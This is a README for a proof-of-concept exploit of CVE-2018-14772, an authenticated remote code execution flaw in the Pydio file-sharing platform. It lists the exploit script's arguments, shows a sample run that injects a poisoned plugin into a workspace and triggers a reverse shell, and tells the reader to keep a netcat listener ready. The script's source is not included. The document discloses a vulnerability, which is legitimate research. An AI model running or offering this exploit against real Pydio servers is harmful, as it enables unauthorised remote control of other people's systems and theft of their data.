# CVE-2018-14772

### info

This is a PoC for CVE-2018-14772 that I discovered in the [pydio](https://pydio.com/) 
file sharing platform. The PoC exploits a post-authentication remote code 
execution vulnerability. It requires administrative credentials to work. You 
can run the exploit like so:

### usage

```
$ python exploit.py -h
usage: exploit.py [-h] -t TARGET -u USERNAME -p PASSWORD -L LISTENER_IP -P
                  LISTENER_PORT [--payload PAYLOAD]

[*] exploit some pydio boxes (academically)

optional arguments:
  -h, --help         show this help message and exit
  --payload PAYLOAD  custom shell command payload (wrap in quotes) i.e.
                     'whoami > /tmp/test'

required arguments:
  -t TARGET          this is the target URI for the pydio instance..i.e.
                     http://127.0.0.1:31337/pydio/
  -u USERNAME        this is the username of the admin user
  -p PASSWORD        this is the password of the admin user
  -L LISTENER_IP     IP address to catch reverse shell on
  -P LISTENER_PORT   port to catch reverse shell on
```

### example exploitation

![img](https://i.imgur.com/oBXqt78.png)

```
$ python exploit.py -t http://127.0.0.1:31337/pydio/ -u admin -p passw0rd -L 192.168.56.1 -P 31337
[*] exploit credentials
  username: 'admin'
  password: 'passw0rd'
[*] creating new workspace to poison
  [+] success
[*] trying to exploit workspace (Pydio Example Workspace) [0f6a1625245d0e69bfba795aa725a30e]
[*] did we inject our poisoned plugin?
  [+] payload injected :)
[*] triggering exploit

[*][~][*][~][*][~][*]     !  brace for shell !     [*][~][*][~][*][~][*]
[*][~][*][~][*][~][*]     !  brace for shell !     [*][~][*][~][*][~][*]
[*][~][*][~][*][~][*]     !  brace for shell !     [*][~][*][~][*][~][*]

... did you catch it ???

[*] cleaning up after ourselves
[*] deleting our created exploit workspace
  [+] success
[+] done :)
```

make sure you have a netcat listener up and it'll be raining shells!


### writeup

incoming

```
- coastal
```
